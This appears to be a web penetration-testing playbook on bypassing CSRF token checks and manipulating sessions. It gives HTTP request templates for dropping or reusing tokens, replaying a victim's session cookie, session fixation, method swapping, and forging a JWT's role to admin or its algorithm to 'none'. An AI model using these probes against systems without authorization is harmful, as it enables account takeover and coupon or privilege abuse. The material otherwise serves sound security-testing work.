# CSRF + Session Manipulation in Logic Flows

## When this applies

- Endpoint that performs a privileged action accepts requests without proper CSRF token validation, OR with an empty/wrong token.
- Sessions are predictable, fixable, or accept multiple session cookies.
- The application's logic flaws are gated only by CSRF — bypassing CSRF unlocks the rest.

## Technique

Probe the CSRF check (remove, blank, wrong value, reuse) and the session validator (other user, fixation, empty, multiple cookies). Many "logic" flaws were really only protected by CSRF; if that token check is weak, all the upstream logic flaws become exploitable cross-site.

## Steps

### CSRF token bypass

```http
# Test: Remove CSRF token entirely
POST /cart/coupon HTTP/1.1
coupon=SIGNUP30
# (no csrf parameter)

# Test: Use empty CSRF token
csrf=&coupon=SIGNUP30

# Test: Use wrong CSRF token
csrf=wrong_token&coupon=SIGNUP30

# Test: Reuse old CSRF token
csrf=old_token_from_previous_request&coupon=SIGNUP30
```

### Session manipulation

```http
# Test: Use another user's session
Cookie: session=victim_session_token

# Test: Session fixation
Cookie: session=attacker_controlled_value

# Test: Empty session
Cookie: session=

# Test: Remove session
# (no Cookie header)

# Test: Multiple sessions
Cookie: session=session1; session=session2
```

### HTTP method tampering

```http
# Original: POST request
POST /cart/coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded
coupon=SIGNUP30

# Try: GET with parameters in URL
GET /cart/coupon?coupon=SIGNUP30 HTTP/1.1

# Try: PUT method
PUT /cart/coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded
coupon=SIGNUP30

# Try: OPTIONS (may reveal allowed methods)
OPTIONS /cart/coupon HTTP/1.1

# Try: HEAD (may process without response)
HEAD /cart/coupon HTTP/1.1
```

### JWT manipulation

If authentication uses JWTs:
```http
# Original JWT
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoidXNlciJ9.signature

# Decoded payload:
{
  "user": "attacker",
  "role": "user"
}

# Modified payload:
{
  "user": "attacker",
  "role": "admin"
}

# Test: Change role and re-encode
# Test: Remove signature
# Test: Change algorithm to "none"
# Test: Use weak secret for HMAC
```

## Verifying success

- Action proceeds without a valid CSRF token.
- Switching to another user's session cookie executes the action under that user's account (or as your own with their data).
- HTTP method swap (POST→GET) succeeds where method-bound CSRF check existed.

## Common pitfalls

- Some apps validate CSRF only on `application/x-www-form-urlencoded` — switching to JSON may skip the check.
- "SameSite=Lax" cookies still ride along on top-level GET — useful for CSRF-via-link.
- JWTs with `alg:none` require both header and signature to be empty/`""`. Some libraries reject empty signature; try `.` or whitespace.

## Tools

- Burp Suite Repeater
- Burp CSRF PoC generator
- jwt.io / jwt_tool
- curl
